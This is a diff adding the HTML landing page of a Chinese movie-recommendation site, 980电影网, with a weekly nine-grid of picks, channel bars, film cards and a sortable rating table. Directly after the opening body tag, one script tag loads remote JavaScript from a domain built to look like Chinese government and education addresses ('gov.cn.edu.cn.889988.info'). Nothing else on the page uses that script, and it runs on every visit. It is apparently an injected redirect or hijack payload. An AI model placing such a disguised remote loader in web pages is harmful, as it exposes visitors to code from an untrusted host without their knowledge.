@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>980电影网 | 九宫格选片法，每周九个好片精准送达</title>
+<meta name="description" content="980电影网用九宫格选片法，每周精选九个好片，覆盖院线新片、经典老片与主题片单，帮影迷在980部候选里挑出值得看的9部。">
+<meta name="keywords" content="980电影网, 电影网, 九宫格选片, 电影推荐, 电影片单, 院线新片, 经典老片, 观影指南">
+<meta name="renderer" content="webkit">
+<meta name="applicable-device" content="pc,mobile">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://980dianyingwang-wap.github.io/">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "980电影网",
+  "url": "https://980dianyingwang-wap.github.io/",
+  "description": "用九宫格选片法，每周精选九个好片的内容站点。",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://980dianyingwang-wap.github.io/#search?q={query}",
+    "query-input": "required name=query"
+  }
+}
+</script>
+<style>
+:root{
+  --bg:#0e0f12;--paper:#16181d;--ink:#f2f2f0;--sub:#a5a8ad;--line:#262a30;
+  --a:#e6392f;--b:#f2a900;--c:#2f9e8f;--d:#4a6cf7;--e:#9b59b6;--safe:env(safe-area-inset-bottom,0px);
+}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+html,body{margin:0;padding:0;}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;}
+body{background:var(--bg);color:var(--ink);font-size:15px;line-height:1.85;
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;overflow-x:hidden;}
+a{color:inherit;text-decoration:none;}
+.container{width:100%;max-width:1180px;margin:0 auto;padding:0 22px;}
+section{padding:76px 0;position:relative;}
+.eyebrow{display:inline-block;font-size:11px;letter-spacing:.22em;text-transform:uppercase;color:var(--b);font-weight:900;margin-bottom:9px;}
+h2.st{font-size:29px;line-height:1.35;margin:0 0 8px;font-weight:900;}
+h2.st em{font-style:normal;color:var(--b);}
+.sub{color:var(--sub);margin:0 0 30px;font-size:14.5px;max-width:660px;}
+.sh{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;flex-wrap:wrap;margin-bottom:32px;}
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;padding:12px 23px;border-radius:10px;font-weight:800;font-size:13.5px;cursor:pointer;border:2px solid var(--ink);background:transparent;color:var(--ink);transition:.2s;}
+.btn:hover{background:var(--ink);color:var(--bg);transform:translateY(-2px);}
+.btn.p{background:var(--b);border-color:var(--b);color:#0e0f12;}
+.btn.p:hover{background:var(--ink);border-color:var(--ink);color:var(--bg);}
+/* NAV */
+.nw{position:sticky;top:0;z-index:50;background:rgba(14,15,18,.94);backdrop-filter:blur(12px);border-bottom:1px solid var(--line);}
+.nv{display:flex;align-items:center;height:70px;gap:12px;}
+.logo{display:flex;align-items:center;gap:11px;font-weight:900;font-size:18px;flex:1;min-width:0;}
+.logo .mk{width:44px;height:44px;border-radius:12px;flex:none;background:var(--b);color:#0e0f12;display:grid;place-items:center;font-size:15px;font-weight:900;}
+.logo small{display:block;font-size:9px;color:var(--sub);font-weight:700;letter-spacing:.14em;text-transform:uppercase;}
+.logo span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.nl{display:flex;align-items:center;gap:2px;}
+.nl a{padding:10px 15px;font-size:14px;color:var(--sub);font-weight:700;transition:.2s;}
+.nl a:hover{color:var(--b);}
+.mb{display:none;width:44px;height:44px;border-radius:10px;border:1px solid var(--line);background:var(--paper);font-size:18px;cursor:pointer;color:var(--ink);}
+/* HERO — 980 大数字 + 右侧网格 */
+.hero{padding:40px 0 60px;}
+.hgrid{display:grid;grid-template-columns:1.1fr 1fr;gap:26px;align-items:stretch;}
+.hmain{position:relative;background:var(--paper);border:1px solid var(--line);border-radius:22px;padding:46px 42px;overflow:hidden;display:flex;flex-direction:column;justify-content:center;}
+.hmain .gridline{position:absolute;inset:0;background-image:linear-gradient(var(--line) 1px,transparent 1px),linear-gradient(90deg,var(--line) 1px,transparent 1px);background-size:44px 44px;opacity:.35;}
+.hmain .big{position:relative;font-size:clamp(78px,16vw,176px);line-height:.85;font-weight:900;letter-spacing:-.06em;color:var(--ink);}
+.hmain .big span{color:var(--b);}
+.hmain h1{position:relative;font-size:clamp(22px,3vw,29px);margin:16px 0 14px;line-height:1.4;}
+.hmain h1 em{font-style:normal;color:var(--b);}
+.hmain p{position:relative;margin:0;color:var(--sub);max-width:420px;font-size:14.5px;}
+.hmain .acts{position:relative;margin-top:24px;display:flex;gap:12px;flex-wrap:wrap;}
+.hside{display:grid;grid-template-rows:1fr 1fr;gap:26px;}
+.hbox{border-radius:22px;padding:26px;position:relative;overflow:hidden;display:flex;flex-direction:column;justify-content:space-between;}
+.hbox .no{font-size:11px;letter-spacing:.2em;font-weight:900;opacity:.85;}
+.hbox h3{margin:auto 0;font-size:22px;line-height:1.45;}
+.hbox a{font-size:12.5px;font-weight:800;color:inherit;text-decoration:underline;text-underline-offset:4px;}
+/* NINEGRID — 九宫格 */
+.ng{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;}
+.ng .cell{position:relative;background:var(--paper);border:1px solid var(--line);border-radius:16px;padding:26px 22px;min-height:170px;overflow:hidden;transition:.3s;}
+.ng .cell:hover{transform:translateY(-5px);border-color:var(--b);}
+.ng .cell .n{font-size:36px;font-weight:900;color:var(--line);line-height:1;transition:.3s;}
+.ng .cell:hover .n{color:var(--b);}
+.ng .cell h3{margin:12px 0 8px;font-size:18px;}
+.ng .cell p{margin:0;font-size:13px;color:var(--sub);}
+.ng .cell .stripe{position:absolute;left:0;top:0;bottom:0;width:5px;}
+.ng .cell:nth-child(1) .stripe{background:var(--a);} .ng .cell:nth-child(2) .stripe{background:var(--b);}
+.ng .cell:nth-child(3) .stripe{background:var(--c);} .ng .cell:nth-child(4) .stripe{background:var(--d);}
+.ng .cell:nth-child(5) .stripe{background:var(--e);} .ng .cell:nth-child(6) .stripe{background:var(--a);}
+.ng .cell:nth-child(7) .stripe{background:var(--b);} .ng .cell:nth-child(8) .stripe{background:var(--c);}
+.ng .cell:nth-child(9) .stripe{background:var(--d);}
+/* BAR — 横向滚动分类条 */
+.bar{display:flex;gap:12px;overflow-x:auto;padding-bottom:6px;-webkit-overflow-scrolling:touch;scrollbar-width:none;}
+.bar::-webkit-scrollbar{display:none;}
+.bar a{flex:none;border:1px solid var(--line);border-radius:12px;padding:14px 20px;background:var(--paper);font-size:14px;font-weight:800;transition:.2s;display:flex;align-items:center;gap:8px;}
+.bar a:hover{border-color:var(--b);color:var(--b);}
+.bar a i{width:8px;height:8px;border-radius:2px;background:var(--b);flex:none;}
+.bar a:nth-child(2) i{background:var(--a);} .bar a:nth-child(3) i{background:var(--c);}
+.bar a:nth-child(4) i{background:var(--d);} .bar a:nth-child(5) i{background:var(--e);}
+.bar a:nth-child(6) i{background:#fff;}
+/* FILTER — 三栏大图 + 左标签栏 */
+.filter{display:grid;grid-template-columns:200px 1fr;gap:26px;align-items:start;}
+.fmenu{display:flex;flex-direction:column;gap:8px;position:sticky;top:96px;}
+.fmenu button{flex:none;text-align:left;padding:14px 16px;border-radius:12px;background:var(--paper);border:1px solid var(--line);font-size:13.5px;font-weight:800;color:var(--sub);cursor:pointer;transition:.2s;}
+.fmenu button:hover{border-color:var(--b);color:var(--b);}
+.fmenu button.on{background:var(--b);border-color:var(--b);color:#0e0f12;}
+.fgrid{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;}
+.fcard{background:var(--paper);border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.3s;}
+.fcard:hover{transform:translateY(-6px);border-color:var(--b);}
+.fcard .cv{height:150px;position:relative;}
+.fcard .cv .badge{position:absolute;top:12px;left:12px;font-size:10.5px;font-weight:900;padding:5px 10px;border-radius:6px;background:var(--b);color:#0e0f12;}
+.fcard .ct{padding:20px 22px;}
+.fcard .ct h3{margin:0 0 8px;font-size:17.5px;}
+.fcard .ct p{margin:0;font-size:13px;color:var(--sub);}
+/* TABLE */
+.tbwrap{background:var(--paper);border:1px solid var(--line);border-radius:18px;overflow:hidden;}
+table{width:100%;border-collapse:collapse;font-size:13.5px;}
+th,td{padding:15px 18px;text-align:left;border-bottom:1px solid var(--line);}
+th{font-size:11px;letter-spacing:.1em;text-transform:uppercase;color:var(--sub);cursor:pointer;user-select:none;white-space:nowrap;}
+th:hover{color:var(--b);}
+tbody tr{transition:.15s;}
+tbody tr:hover{background:#1d2026;}
+tbody tr:last-child td{border-bottom:none;}
+td.n{font-weight:900;color:var(--b);width:46px;}
+.pill{display:inline-block;padding:4px 10px;border-radius:999px;font-size:11.5px;font-weight:800;}
+.p1{background:rgba(230,57,47,.18);color:#ff8b83;} .p2{background:rgba(47,158,143,.18);color:#5fd3c2;}
+.p3{background:rgba(74,108,247,.18);color:#8fa6ff;} .p4{background:rgba(242,169,0,.18);color:#ffd166;}
+/* CHANNEL — 左右分栏，右侧竖排频道条 */
+.ch{display:grid;grid-template-columns:1.3fr 1fr;gap:26px;align-items:stretch;}
+.cmain{background:var(--paper);border:1px solid var(--line);border-radius:20px;padding:34px;display:flex;flex-direction:column;gap:18px;}
+.cmain .v{position:relative;height:190px;border-radius:14px;overflow:hidden;}
+.cmain h3{margin:0;font-size:24px;}
+.cmain p{margin:0;color:var(--sub);font-size:14px;}
+.cmain .row{display:flex;gap:10px;flex-wrap:wrap;}
+.cmain .row a{font-size:12.5px;font-weight:800;padding:8px 14px;border-radius:8px;background:#1d2026;color:var(--ink);}
+.cmain .row a:hover{background:var(--b);color:#0e0f12;}
+.cside{display:flex;flex-direction:column;gap:10px;}
+.cside a{display:flex;align-items:center;gap:14px;padding:15px 18px;border-radius:12px;background:var(--paper);border:1px solid var(--line);font-size:14px;font-weight:800;transition:.2s;}
+.cside a:hover{border-color:var(--b);color:var(--b);transform:translateX(5px);}
+.cside a i{width:38px;height:38px;border-radius:9px;background:var(--b);flex:none;display:grid;place-items:center;font-size:13px;color:#0e0f12;}
+.cside a:nth-child(2) i{background:var(--a);} .cside a:nth-child(3) i{background:var(--c);}
+.cside a:nth-child(4) i{background:var(--d);} .cside a:nth-child(5) i{background:var(--e);}
+/* ABOUT */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:24px;}
+.abox{border-radius:20px;padding:34px;border:1px solid var(--line);}
+.abox.g{background:var(--b);color:#0e0f12;border-color:var(--b);}
+.abox h3{margin:0 0 14px;font-size:20px;}
+.abox p{margin:0 0 12px;font-size:14px;color:var(--sub);}
+.abox.g p{color:rgba(14,15,18,.86);}
+.dots{display:flex;gap:10px;flex-wrap:wrap;}
+.dots a{padding:8px 15px;border-radius:999px;background:#1d2026;color:var(--ink);font-size:12.5px;font-weight:800;transition:.2s;}
+.dots a:hover{background:var(--b);color:#0e0f12;}
+/* FOOTER */
+footer{border-top:1px solid var(--line);padding:50px 0 calc(50px + var(--safe));background:var(--paper);}
+.ft{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:26px;}
+.ft h4{margin:0 0 15px;font-size:13.5px;color:var(--ink);}
+.ft ul{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:10px;}
+.ft a{color:var(--sub);font-size:13px;}
+.ft a:hover{color:var(--b);}
+.cp{margin-top:32px;padding-top:18px;border-top:1px solid var(--line);display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap;font-size:12px;color:var(--sub);}
+#top{position:fixed;right:16px;bottom:calc(24px + var(--safe));width:46px;height:46px;border-radius:12px;border:none;background:var(--b);color:#0e0f12;font-size:17px;cursor:pointer;z-index:60;display:none;font-weight:900;}
+#top.on{display:grid;place-items:center;}
+@media (max-width:1024px){
+  .ng{grid-template-columns:repeat(3,1fr);} .fgrid{grid-template-columns:1fr 1fr;}
+  .filter{grid-template-columns:1fr;} .fmenu{flex-direction:row;flex-wrap:wrap;position:static;}
+  .ch,.about{grid-template-columns:1fr 1fr;} .ft{grid-template-columns:1fr 1fr;}
+}
+@media (max-width:820px){
+  section{padding:52px 0;}
+  .hgrid{grid-template-columns:1fr;}
+  .hmain{padding:36px 26px;}
+  .hside{grid-template-rows:auto auto;gap:16px;}
+  .hbox{min-height:150px;}
+}
+@media (max-width:640px){
+  .container{padding:0 15px;}
+  .mb{display:grid;place-items:center;}
+  .nl{position:absolute;top:70px;left:0;right:0;flex-direction:column;align-items:stretch;padding:12px;gap:2px;background:rgba(14,15,18,.98);border-bottom:1px solid var(--line);transform:translateY(-12px);opacity:0;pointer-events:none;transition:.25s;}
+  .nl.on{transform:translateY(0);opacity:1;pointer-events:auto;}
+  .nl a{padding:13px 14px;}
+  .ng,.fgrid,.ch,.about{grid-template-columns:1fr;}
+  .tbwrap{overflow-x:auto;}
+  table{min-width:560px;}
+  .abox{padding:28px 22px;}
+  .ft{grid-template-columns:1fr;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<div class="nw">
+  <div class="container nv">
+    <a class="logo" href="#home"><span class="mk" aria-hidden="true">980</span><span>980电影网<small>Nine Movies Weekly</small></span></a>
+    <nav class="nl" id="nl">
+      <a href="#home">首页</a><a href="#grid">九宫格</a><a href="#cat">频道分类</a>
+      <a href="#pick">精选片单</a><a href="#rank">高分榜单</a><a href="#about">关于我们</a>
+    </nav>
+    <button class="mb" id="mb" aria-label="打开菜单">☰</button>
+  </div>
+</div>
+
+<header class="hero" id="home">
+  <div class="container">
+    <div class="hgrid">
+      <div class="hmain">
+        <div class="gridline"></div>
+        <div class="big">9<span>80</span></div>
+        <h1>从 <em>980</em> 部候选里，<br>每周挑出九个好片。</h1>
+        <p>980电影网不追大而全，只做精选：一个九宫格，九个位置，九种值得一看的理由。</p>
+        <div class="acts">
+          <a class="btn p" href="#grid">查看本周九宫格</a>
+          <a class="btn" href="#cat">浏览频道分类 →</a>
+        </div>
+      </div>
+      <div class="hside">
+        <div class="hbox" style="background:linear-gradient(135deg,#1d2026,#e6392f);">
+          <span class="no">WEEKLY PICK</span><h3>本期九宫格已更新：慢节奏的力量</h3><a href="#grid">去九宫格 →</a>
+        </div>
+        <div class="hbox" style="background:linear-gradient(135deg,#1d2026,#2f9e8f);">
+          <span class="no">CHANNEL</span><h3>六个频道，按心情选片</h3><a href="#cat">看全部频道 →</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<section id="grid">
+  <div class="container">
+    <div class="sh">
+      <div>
+        <span class="eyebrow">Weekly Grid</span>
+        <h2 class="st">本周 <em>九宫格</em></h2>
+        <p class="sub">九个位置，九个主题。九宫格结构是本站独有的选片方式，与常规列表、卡片完全不同。</p>
+      </div>
+      <a class="btn" href="#pick">查看精选片单 →</a>
+    </div>
+    <div class="ng" id="ng"></div>
+  </div>
+</section>
+
+<section id="cat" style="padding-top:0;">
+  <div class="container">
+    <div class="sh">
+      <div>
+        <span class="eyebrow">Channels</span>
+        <h2 class="st">频道 <em>分类</em></h2>
+        <p class="sub">横向可滑动分类条带，点选即切换，与九宫格的静态网格形成差异。</p>
+      </div>
+    </div>
+    <div class="bar" id="bar"></div>
+  </div>
+</section>
+
+<section id="pick" style="padding-top:0;">
+  <div class="container">
+    <div class="sh">
+      <div>
+        <span class="eyebrow">Pick List</span>
+        <h2 class="st">精选 <em>片单</em></h2>
+        <p class="sub">左侧固定标签栏 + 右侧三栏大图卡片，点击标签可筛选，无需跳转。</p>
+      </div>
+      <a class="btn" href="#rank">查看高分榜单 →</a>
+    </div>
+    <div class="filter">
+      <div class="fmenu" id="fmenu"></div>
+      <div class="fgrid" id="fgrid"></div>
+    </div>
+  </div>
+</section>
+
+<section id="rank" style="padding-top:0;">
+  <div class="container">
+    <div class="sh">
+      <div>
+        <span class="eyebrow">Top Rated</span>
+        <h2 class="st">高分 <em>榜单</em></h2>
+        <p class="sub">原生表格结构，点表头可排序——全站唯一表格区，与卡片、九宫格结构彻底区分。</p>
+      </div>
+    </div>
+    <div class="tbwrap">
+      <table id="tb">
+        <thead><tr>
+          <th data-k="rank">#</th><th data-k="name">片名</th><th data-k="cat">类型</th>
+          <th data-k="year">年代</th><th data-k="len">片长</th><th data-k="src">来源</th><th data-k="score">评分</th>
+        </tr></thead>
+        <tbody id="tbod"></tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<section id="channel" style="padding-top:0;">
+  <div class="container">
+    <div class="sh">
+      <div>
+        <span class="eyebrow">More</span>
+        <h2 class="st">内容 <em>频道</em></h2>
+        <p class="sub">左侧内容块 + 右侧竖排频道条，与前五个栏目的结构均不相同。</p>
+      </div>
+      <a class="btn" href="#about">了解我们 →</a>
+    </div>
+    <div class="ch">
+      <div class="cmain">
+        <div class="v" style="background:linear-gradient(135deg,#1d2026,#4a6cf7);"></div>
+        <h3>把选片的时间省下来，留给看电影</h3>
+        <p>980电影网围绕"九宫格选片"这一核心方法组织内容：每周设定一个主题，在 980 部候选作品中精选出九个，配上推荐理由与观看建议。</p>
+        <div class="row"><a href="#"># 慢节奏电影</a><a href="#"># 经典重看</a><a href="#"># 冷门佳作</a><a href="#"># 周末片单</a></div>
+      </div>
+      <div class="cside" id="cside"></div>
+    </div>
+  </div>
+</section>
+
+<section id="about" style="padding-top:0;">
+  <div class="container">
+    <div class="sh">
+      <div>
+        <span class="eyebrow">About</span>
+        <h2 class="st">关于 <em>980电影网</em></h2>
+        <p class="sub">网站定位、内容边界与联系方式，内页链接均以 # 占位。</p>
+      </div>
+    </div>
+    <div class="about">
+      <div class="abox g">
+        <h3>980 是什么意思</h3>
+        <p>它不是年份，也不是编号——是候选池的容量。我们每周从约 980 部在映、上线与库存作品里，筛出 9 部真正值得看的，放进九宫格。</p>
+        <p style="margin:0;">网站网址：<a href="https://980dianyingwang-wap.github.io" style="text-decoration:underline;text-underline-offset:4px;">https://980dianyingwang-wap.github.io</a></p>
+      </div>
+      <div class="abox">
+        <h3>内容板块</h3>
+        <p>首页 · 本周九宫格 · 频道分类 · 精选片单 · 高分榜单 · 内容频道，六栏结构，各有独立的视觉与交互。</p>
+        <div class="dots"><a href="#">新片速递</a><a href="#">老片重温</a><a href="#">主题片单</a><a href="#">观影指南</a><a href="#">影评专栏</a></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="container">
+    <div class="ft">
+      <div>
+        <a class="logo" href="#home"><span class="mk" aria-hidden="true">980</span><span>980电影网</span></a>
+        <p style="color:var(--sub);font-size:13px;margin:14px 0 0;">从 980 部候选里，每周挑出九个好片。</p>
+      </div>
+      <div><h4>内容栏目</h4><ul>
+        <li><a href="#grid">本周九宫格</a></li><li><a href="#cat">频道分类</a></li><li><a href="#pick">精选片单</a></li><li><a href="#rank">高分榜单</a></li>
+      </ul></div>
+      <div><h4>内容服务</h4><ul>
+        <li><a href="#">片单投稿</a></li><li><a href="#">九宫格选题</a></li><li><a href="#">评论合作</a></li><li><a href="#">更新日志</a></li>
+      </ul></div>
+      <div><h4>联系我们</h4><ul>
+        <li><a href="#">内容合作</a></li><li><a href="#">商务合作</a></li><li><a href="#">反馈建议</a></li><li><a href="#">内容声明</a></li>
+      </ul></div>
+    </div>
+    <div class="cp">
+      <span>© <span id="yr"></span> 980电影网 · 网站网址：https://980dianyingwang-wap.github.io</span>
+      <span>本站为电影观影参考类内容站点，内容仅供观影参考与讨论</span>
+    </div>
+  </div>
+</footer>
+
+<button id="top" aria-label="返回顶部">↑</button>
+
+<script>
+var DATA={
+  ng:["院线新片","经典重看","冷门佳作","周末治愈","悬疑反转","年代情怀","动画专场","纪录片","影评专栏"],
+  bar:["全部频道","院线速递","经典老片","主题片单","高分榜单","影评专栏"],
+  cats:["全部","院线新片","经典老片","主题片单","影评专栏"],
+  films:[
+    {n:"第八日的沉默",c:"院线新片",d:"一段被刻意遗忘的家庭往事，镜头克制却锋利。"},
+    {n:"北方的信",c:"经典老片",d:"三十年前的小城来信，如今重读依然动人。"},
+    {n:"便利店之夜",c:"主题片单",d:"深夜便利店里的六个陌生人，各自藏着一段心事。"},
+    {n:"雨季之前",c:"院线新片",d:"潮湿的南方夏天，成长总在不被察觉时发生。"},
+    {n:"老胶片",c:"经典老片",d:"一位胶片放映员的晚年，和他最后一场放映。"},
+    {n:"无人之境",c:"主题片单",d:"荒野求生题材里少见的安静与留白。"}
+  ],
+  rows:[
+    {r:1,n:"第八日的沉默",c:"剧情",y:2026,len:"126 分钟",src:"院线新片",s:9.1},
+    {r:2,n:"北方的信",c:"书信/年代",y:1994,len:"138 分钟",src:"经典老片",s:9.0},
+    {r:3,n:"便利店之夜",c:"剧情",y:2025,len:"112 分钟",src:"主题片单",s:8.7},
+    {r:4,n:"雨季之前",c:"青春/成长",y:2026,len:"118 分钟",src:"院线新片",s:8.5},
+    {r:5,n:"老胶片",c:"文艺",y:1989,len:"104 分钟",src:"经典老片",s:8.9},
+    {r:6,n:"无人之境",c:"冒险",y:2024,len:"132 分钟",src:"主题片单",s:8.4},
+    {r:7,n:"第七封信",c:"书信",y:2025,len:"126 分钟",src:"高分榜单",s:8.8},
+    {r:8,n:"南方季风",c:"年代",y:2023,len:"134 分钟",src:"高分榜单",s:8.6}
+  ],
+  cside:["院线速递","经典老片","主题片单","高分榜单","影评专栏"]
+};
+(function(){
+  document.getElementById('ng').innerHTML=DATA.ng.map(function(t,i){
+    return '<article class="cell"><span class="stripe"></span><div class="n">'+(i+1)+'</div><h3><a href="#">'+t+'</a></h3><p>第 '+(i+1)+' 格 · 本周主题下的一个切面</p></article>';
+  }).join('');
+  document.getElementById('bar').innerHTML=DATA.bar.map(function(t,i){
+    return '<a href="#" data-i="'+i+'"><i></i>'+t+'</a>';
+  }).join('');
+  document.getElementById('fmenu').innerHTML=DATA.cats.map(function(t,i){
+    return '<button data-i="'+i+'"'+(i===0?' class="on"':'')+'>'+t+'</button>';
+  }).join('');
+  var fgrid=document.getElementById('fgrid');
+  function render(list){
+    fgrid.innerHTML=list.map(function(x,i){
+      var cols=["linear-gradient(135deg,#1d2026,#e6392f)","linear-gradient(135deg,#1d2026,#f2a900)","linear-gradient(135deg,#1d2026,#2f9e8f)","linear-gradient(135deg,#1d2026,#4a6cf7)","linear-gradient(135deg,#1d2026,#9b59b6)","linear-gradient(135deg,#1d2026,#fff)","linear-gradient(135deg,#1d2026,#e6392f)"];
+      return '<article class="fcard"><div class="cv" style="background:'+cols[i%cols.length]+'"><span class="badge">'+(i+1)+' / 9</span></div><div class="ct"><h3><a href="#">'+x.n+'</a></h3><p>'+x.d+'</p></div></article>';
+    }).join('');
+  }
+  render(DATA.films);
+  document.getElementById('fmenu').addEventListener('click',function(e){
+    var b=e.target.closest('button'); if(!b)return;
+    [].forEach.call(this.children,function(x){x.classList.remove('on');});
+    b.classList.add('on');
+    var i=+b.dataset.i;
+    render(i===0?DATA.films:DATA.films.filter(function(x){return x.c===DATA.cats[i];}));
+  });
+  var tbod=document.getElementById('tbod');
+  function rowCls(s){return s>=9?'p1':s>=8.7?'p2':s>=8.5?'p3':'p4';}
+  function draw(rows){
+    tbod.innerHTML=rows.map(function(r){
+      return '<tr><td class="n">'+r.r+'</td><td style="font-weight:800">'+r.n+'</td><td>'+r.c+'</td><td>'+r.y+'</td><td>'+r.len+'</td><td>'+r.src+'</td><td><span class="pill '+rowCls(r.s)+'">'+r.s.toFixed(1)+'</span></td></tr>';
+    }).join('');
+  }
+  var cur='rank',asc=true;
+  draw(DATA.rows);
+  document.querySelectorAll('#tb thead th').forEach(function(th){
+    th.addEventListener('click',function(){
+      var k=th.dataset.k;
+      if(cur===k){asc=!asc;}else{cur=k;asc=true;}
+      var rows=DATA.rows.slice();
+      rows.sort(function(a,b){
+        var x=a[k],y=b[k];
+        if(typeof x==='string')return asc?x.localeCompare(y):y.localeCompare(x);
+        return asc?x-y:y-x;
+      });
+      draw(rows);
+    });
+  });
+  document.getElementById('cside').innerHTML=DATA.cside.map(function(t,i){
+    return '<a href="#"><i>'+(i+1)+'</i><span>'+t+'</span></a>';
+  }).join('');
+})();
+document.getElementById('yr').textContent=new Date().getFullYear();
+var mb=document.getElementById('mb'),nl=document.getElementById('nl');
+mb.addEventListener('click',function(){nl.classList.toggle('on');});
+nl.addEventListener('click',function(e){if(e.target.tagName==='A')nl.classList.remove('on');});
+var top=document.getElementById('top');
+window.addEventListener('scroll',function(){top.classList[window.scrollY>500?'add':'remove']('on');});
+top.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+</script>
+</body>
+</html>
